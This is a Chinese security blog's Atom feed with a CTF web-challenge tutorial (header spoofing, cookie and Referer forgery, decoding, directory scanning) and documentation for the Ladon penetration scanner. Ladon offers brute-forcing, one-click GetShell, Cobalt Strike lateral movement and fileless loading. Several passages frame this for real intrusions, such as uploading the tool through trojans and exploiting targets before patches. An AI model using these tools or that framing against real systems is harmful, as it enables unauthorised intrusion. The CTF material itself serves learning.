<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K8哥哥’s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://k8gege.org/"/>
  <updated>2020-08-22T17:01:22.588Z</updated>
  <id>http://k8gege.org/</id>
  
  <author>
    <name>K8gege</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>〖教程〗K8飞刀-网络安全CTF解题Web篇10个例子</title>
    <link href="http://k8gege.org/p/ctf_k8fly.html"/>
    <id>http://k8gege.org/p/ctf_k8fly.html</id>
    <published>2020-08-22T14:00:00.000Z</published>
    <updated>2020-08-22T17:01:22.588Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间有人和我说什么时候有空出些CTF用的工具，实际上CTF考查的内容，实战中用到的很多工具都可以使用，关键在于你懂不懂用。也看到有人搜索如何使用K8飞刀，在此以CTF题为例，教大家如何使用K8飞刀的HackerIE功能（相当于Hackbar插件的高级版），以及编码解码功能的使用（模块涉及多种编码以及加密解密算法），除了实战会用到以外，CTF也可以用到，不过CTF中常见的应该是BASE64、HTML编码、SQL注入编码之类的，实战中密码除了MD5、SHA1以外最常见的莫过于BASE64了，XSS里HTML编码等也会经常用到，至于什么栅栏密码之类的实战几乎很少遇到，所以有些CTF出题和实战还是两回事，虽然说栅栏算法也非常简单，但从实战角度来说，考查用处不大，实战几乎不见的有必要考吗？如同书呆子考试靠死记硬背靠运气拿高分，拿了高分实际工作解决不了新问题，这种就是没用。</p><h3 id="考查知识点"><a href="#考查知识点" class="headerlink" title="考查知识点"></a>考查知识点</h3><p>1.查看HTML代码<br>2.GET提交<br>3.POST提交<br>4.伪造IP<br>5.Base64解密<br>6.HTML实体解密<br>7.PUT/MOVE漏洞<br>8.URL编码<br>9.目录扫描<br>10.Cookie欺骗</p><h3 id="题目1-HTML查看"><a href="#题目1-HTML查看" class="headerlink" title="题目1 HTML查看"></a>题目1 HTML查看</h3><p>网址： <a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a></p><p>分析：<br>直接访问会看到一堆表情，浏览器右键查看HTML代码即可，（但实战遇到屏蔽右键查看就无效）</p><p>解题：</p><p>K8飞刀–HackerIE–Get方式–网址web2–结果选”文本”–提交，即可看到注释中的Flag</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html1.PNG"></p><p>PS：K8飞刀可以无视”网站屏蔽查看HTML代码“功能，现实这样的网页很多，很多CTF不考查，所以CTF和实战是有区别的。</p><h3 id="题目2-HTML实体"><a href="#题目2-HTML实体" class="headerlink" title="题目2 HTML实体"></a>题目2 HTML实体</h3><p>网址： <a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://123.206.87.240:8002/web3/</a></p><p>分析：<br>直接访问会无限弹框，提示FLAG就在这里，所以这里我们选择”文本”模式查看，浏览器模式会无限弹框。</p><p>解题：</p><p>K8飞刀–HackerIE–Get方式–网址web3–结果选”文本”–提交，看到一串可疑的HTML实体字符串，<br>编码解码–粘贴加密的Flag–右键选中Flag–编码转换–XSS跨站–HTML实体(Dec),解密获取Falg</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html2.PNG"></p><p>PS：有些CTF也会把HTML实体编码放在图片里面(记事本打开图片就能看到)    </p><h3 id="题目3-GET提交"><a href="#题目3-GET提交" class="headerlink" title="题目3 GET提交"></a>题目3 GET提交</h3><p>网址：<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a></p><p>$what=$_GET[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p><p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p><p>解题：<br>网址 <a href="http://123.206.87.240:8002/get?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get?what=flag</a><br>K8飞刀–HackerIE–Get方式–网址get–结果选”文本”–提交，可看到返回flag</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_get.PNG"></p><h3 id="题目4-POST提交"><a href="#题目4-POST提交" class="headerlink" title="题目4 POST提交"></a>题目4 POST提交</h3><p>网址: <a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a></p><p>$what=$_POST[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p><p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p><p>解题：<br>K8飞刀–HackerIE–Post方式–网址post–结果选”文本”–提交，可看到返回flag<br>网址：<a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a>  提交数据：what=flag</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_post.PNG"></p><h3 id="题目5-伪造IP"><a href="#题目5-伪造IP" class="headerlink" title="题目5 伪造IP"></a>题目5 伪造IP</h3><p>伪造IP这个考查点非常不错，因为现实中确实有很多网站后台存在IP限制。</p><p>网址：<a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a>  管理员系统</p><p>使用K8飞刀访问提示“IP禁止访问”，切换文本看到注释中含有Base64字符串,编码解密得到test123</p><p>K8飞刀–HackerIE–Post方式–提交,返回Flag<br>提交数据：user=admin&amp;pass=test123</p><p>X-Forwarded-For 值为 127.0.0.1</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_xorip.PNG">        </p><h3 id="题目6-PUT漏洞"><a href="#题目6-PUT漏洞" class="headerlink" title="题目6 PUT漏洞"></a>题目6 PUT漏洞</h3><p>这里没找到在线的题(也懒得找),有些CTF可能会考查PUT写权限漏洞，实战也是一个很经典的漏洞，如IIS6写权限GetShell或Tomcat CVE-2017-12615，实际上如果Apache或Ngix配置不当也可以通过PUT直接GetShell的，但该功能飞刀里没有，需使用LadonExp才可实现。</p><p>遇到的话可参考<br><a href="http://k8gege.org/Ladon/iisput">http://k8gege.org/Ladon/iisput</a><br><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p><h3 id="题目7-URL编码"><a href="#题目7-URL编码" class="headerlink" title="题目7 URL编码"></a>题目7 URL编码</h3><p>网址：<a href="http://123.206.87.240:8002/web4" target="_blank" rel="noopener">http://123.206.87.240:8002/web4</a></p><p>访问看到几个URL编码的变量，那就解密看看吧<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url1.PNG"><br>复制使用K8飞刀解密后得到Value值<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url2.PNG"><br>提交后得到Flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url3.PNG"></p><h3 id="题目8-cookie欺骗"><a href="#题目8-cookie欺骗" class="headerlink" title="题目8 cookie欺骗"></a>题目8 cookie欺骗</h3><p>访问 <a href="http://123.206.87.240:8002/web11/" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/</a> 会跳转到以下地址<br><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>Cookie: margin=margin</p><p>解题：K8飞刀–HackerIE–设置Cookie提交即可<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_cookie.PNG"></p><h3 id="题目9-Referer来源"><a href="#题目9-Referer来源" class="headerlink" title="题目9 Referer来源"></a>题目9 Referer来源</h3><p>分析：访问提示，are you from google? 在URL里来源为Referer</p><p><a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">http://123.206.87.240:9009/from.php</a></p><p>解题：K8飞刀设置Referer为google即可<br>Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_referer.PNG"></p><h3 id="题目9-PHP-post"><a href="#题目9-PHP-post" class="headerlink" title="题目9 PHP post"></a>题目9 PHP post</h3><p><a href="http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin" target="_blank" rel="noopener">http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin</a><br>post：passwd[]=2</p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_phppost.PNG"></p><h3 id="题目10-目录扫描"><a href="#题目10-目录扫描" class="headerlink" title="题目10 目录扫描"></a>题目10 目录扫描</h3><p><a href="http://123.206.87.240:8002/web13/" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/</a><br>404 Not Found</p><p>分析：访问提示404，本页不存在，那我们扫目录看有哪些页面可访问</p><p>K8扫到robots.txt访问发现result.php,下面提示x=密码就出现flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir.PNG"></p><p><a href="http://123.206.87.240:8002/web13/resusl.php?x=admin" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/resusl.php?x=admin</a></p><p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir2.PNG"></p><h3 id="解题速度"><a href="#解题速度" class="headerlink" title="解题速度"></a>解题速度</h3><p>天下武功唯快不破，只有解题速度快，才有机会做更多的题，同样能全解的情况下，自然也是速度快的拿第一。</p><p>网上有不少教程对于，PUT提交或IP这种简单修改使用BURP来解题，这个也没什么问题，问题在于有些人并不熟悉相关工具。最怕的是你也熟悉该工具，但打CTF时，环境因素或自己不细心少了哪一步，会浪费掉很多时间，我们都知道如果几分钟就能把前面简单的FLAG提交，那么就会有更多的时间去解难题拿更高分。所以对于考查HTTP参数提交的知识点，可以完全使用K8飞刀或LadonExp这种一键的工具，不要使用Burp这种步骤多的工具，钥题时间越快对你越有利。实战也是一样，你早一天拿到目标，和只做到一半就被发现然后管理员打补丁，没办法再通过该漏洞GetShell甚至也无其它漏洞时你就知道错了。如果你多次提交失败管理员还是没发现，只能说明他很蠢，你运气好可以随便搞。</p><h3 id="考查漏洞"><a href="#考查漏洞" class="headerlink" title="考查漏洞"></a>考查漏洞</h3><p>对于一些更贴近实战的题，比如直接考查相关漏洞的，也可直接使用K8飞刀的漏洞库上的EXP进行测试，很简单只需提供URL即可一键利用。当然里面的EXP可能比较老，如果考查的漏洞里面没有，那只能换上其它针对性的工具。</p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p><a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间有人和我说什么时候有空出些CTF用的工具，实际上CTF考查的内容，实战中用到的很多工具都可以使用，关键在于你懂不懂用。也看到有人搜索如何使用K8飞刀，在此以CTF题为例，教大家如何使用K8飞刀的HackerIE功能（相当于Hackbar插件的高级版），以及编码解码功
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://k8gege.org/categories/CTF/"/>
    
    
      <category term="K8飞刀" scheme="http://k8gege.org/tags/K8fly/"/>
    
      <category term="CTF" scheme="http://k8gege.org/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Ladon大型内网渗透扫描器&amp;Cobalt Strike</title>
    <link href="http://k8gege.org/p/648af4b3.html"/>
    <id>http://k8gege.org/p/648af4b3.html</id>
    <published>2020-08-15T14:30:24.000Z</published>
    <updated>2020-08-15T16:36:34.794Z</updated>
    
    <content type="html"><![CDATA[<p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置92个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息</p><a id="more"></a><p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-7.1-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon-for-Windows"><a href="#Ladon-for-Windows" class="headerlink" title="Ladon for Windows"></a>Ladon for Windows</h3><p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p><h3 id="Ladon-GUI"><a href="#Ladon-GUI" class="headerlink" title="Ladon GUI"></a>Ladon GUI</h3><p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.gif"></p><h3 id="Ladon-for-Cobalt-Strike"><a href="#Ladon-for-Cobalt-Strike" class="headerlink" title="Ladon for Cobalt Strike"></a>Ladon for Cobalt Strike</h3><p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="Ladon-for-PowerShell"><a href="#Ladon-for-PowerShell" class="headerlink" title="Ladon for PowerShell"></a>Ladon for PowerShell</h3><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h3 id="Python-Ladon"><a href="#Python-Ladon" class="headerlink" title="Python Ladon"></a>Python Ladon</h3><p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p><h3 id="Ladon-for-Linux"><a href="#Ladon-for-Linux" class="headerlink" title="Ladon for Linux"></a>Ladon for Linux</h3><p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table><thead><tr><th>ID</th><th>主题</th><th>URL</th></tr></thead><tbody><tr><td>0</td><td>Ladon文档主页</td><td><a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></td></tr><tr><td>1</td><td>Ladon基础文档</td><td><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></td></tr><tr><td>2</td><td>Ladon用法例子</td><td><a href="http://k8gege.org/Ladon/example.html">http://k8gege.org/Ladon/example.html</a></td></tr><tr><td>3</td><td>基础用法详解</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td></tr><tr><td>4</td><td>Cobalt Strike</td><td><a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a></td></tr><tr><td>5</td><td>Exp生成器使用</td><td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td></tr><tr><td>6</td><td>高度自定义插件</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td></tr><tr><td>7</td><td>外部模块参考</td><td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td></tr><tr><td>8</td><td>PowerLadon</td><td><a href="https://github.com/k8gege/powerladon" target="_blank" rel="noopener">https://github.com/k8gege/powerladon</a></td></tr><tr><td>9</td><td>PythonLadon</td><td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td></tr><tr><td>10</td><td>LinuxLadon</td><td><a href="https://github.com/k8gege/KaliLadon" target="_blank" rel="noopener">https://github.com/k8gege/KaliLadon</a></td></tr><tr><td>12</td><td>漏洞演示视频</td><td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td></tr><tr><td>13</td><td>Ladon6.0文档</td><td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td></tr><tr><td>14</td><td>Ladon6.2文档</td><td><a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a></td></tr><tr><td>13</td><td>Ladon6.4文档</td><td><a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a></td></tr><tr><td>16</td><td>Ladon6.5文档</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr></tbody></table><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>git clone <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a><br>使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE</p><h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p><h3 id="关于Ladon"><a href="#关于Ladon" class="headerlink" title="关于Ladon"></a>关于Ladon</h3><p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。</p><h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.1版本内置85个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p><h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透</p><h4 id="Linux、Mac"><a href="#Linux、Mac" class="headerlink" title="Linux、Mac"></a>Linux、Mac</h4><p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install mono-runtime</span><br><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br><span class="line">mono Ladon 192.168.1.8/24 OnlinePC</span><br></pre></td></tr></table></figure><p>由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明</p><p>实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试</p><h3 id="奇葩条件"><a href="#奇葩条件" class="headerlink" title="奇葩条件"></a>奇葩条件</h3><p>实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br>有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br>Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br>还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的</p><h3 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h3><p>一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具</p><h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><p>扫描流量小<br>程序体积小<br>功能丰富强大<br>程序简单易用<br>插件支持多种语言<br>跨平台(Win/Kali/Ubuntu)等<br>支持Cobalt Strike插件化<br>支持PowerShell无文件渗透<br>Exp生成器可一键定制Poc<br>多版本适用各种环境</p><h3 id="程序参数功能"><a href="#程序参数功能" class="headerlink" title="程序参数功能"></a>程序参数功能</h3><p>1  支持指定IP扫描<br>2  支持指定域名扫描<br>3  支持指定机器名扫描<br>4  支持指定C段扫描(ip/24)<br>5  支持指定B段扫描(ip/16)<br>6  支持指定A段扫描(ip/8)<br>7  支持指定URL扫描<br>8  支持批量IP扫描(ip.txt)<br>9  支持批量C段扫描(ip24.txt)<br>10 支持批量B段扫描(ip16.txt)<br>11 支持批量URL扫描(url.txt)<br>12 支持批量域名扫描(domain.txt)<br>13 支持批量机器名扫描(host.txt)<br>14 支持批量字符串列表(str.txt)<br>15 支持主机帐密列表(check.txt)<br>16 支持用户密码列表(userpass.txt)<br>17 支持指定范围C段扫描<br>18 支持参数加载自定义DLL（仅限C#）<br>19 支持参数加载自定义EXE（仅限C#）<br>20 支持参数加载自定义INI配置文件<br>21 支持参数加载自定义PowerShell<br>22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>26 INI配置支持自定义程序密码爆破</p><h3 id="内置功能模块-58"><a href="#内置功能模块-58" class="headerlink" title="内置功能模块(58)"></a>内置功能模块(58)</h3><h4 id="0x001-资产扫描-11"><a href="#0x001-资产扫描-11" class="headerlink" title="0x001 资产扫描(11)"></a>0x001 资产扫描(11)</h4><p>例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>例子: Ladon 192.168.1.8/24 OnlinePC</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/55476.html">Ping</a></td><td>存活主机扫描</td><td>存活IP(探测速度很快3-6秒/C段)</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a></td><td>存活主机扫描</td><td>存活IP、Mac地址、机器名、设备制造商</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlineIP</a></td><td>仅存活主机IP</td><td>存活IP</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">UrlScan</a></td><td>URL域名扫描</td><td>同服URL（不验证IP、域名、Web标题）</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">SameWeb</a></td><td>同服域名扫描</td><td>同服URL（验证IP、域名、Web标题）</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebScan</a></td><td>Web信息扫描</td><td>存活IP、主机名、Banner、Web标题</td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebDir</a></td><td>后台目录扫描</td><td>地址、HTTP状态</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4" target="_blank" rel="noopener">SubDomain</a></td><td>子域名爆破</td><td>子域名 (可用DomainIP/HostIP解析)</td></tr><tr><td>9</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">DomainIP</a></td><td>域名解析IP</td><td>域名、IP</td></tr><tr><td>10</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">HostIP</a></td><td>主机名转IP</td><td>IP、域名</td></tr><tr><td>11</td><td><a href="http://k8gege.org/p/39070.html">AdiDnsDump</a></td><td>域内机器信息获取(非域内请使用LdapScan探测)</td><td>IP、域名</td></tr></tbody></table><h4 id="0x002-指纹识别-服务识别-8"><a href="#0x002-指纹识别-服务识别-8" class="headerlink" title="0x002 指纹识别/服务识别(8)"></a>0x002 指纹识别/服务识别(8)</h4><p>例子: Ladon OsScan<br>例子: Ladon 192.168.1.8/24 OsScan</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B" target="_blank" rel="noopener">OsScan</a></td><td>操作系统版本探测</td><td>存活IP、工作组\机器名、操作系统、开放服务</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB)" target="_blank" rel="noopener">PortScan</a></td><td>端口扫描含Banner</td><td>主机名、开放端口、服务识别、Banner、Web</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB" target="_blank" rel="noopener">WhatCMS</a></td><td>75种Web指纹识别</td><td>URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等</td></tr><tr><td>4</td><td><a 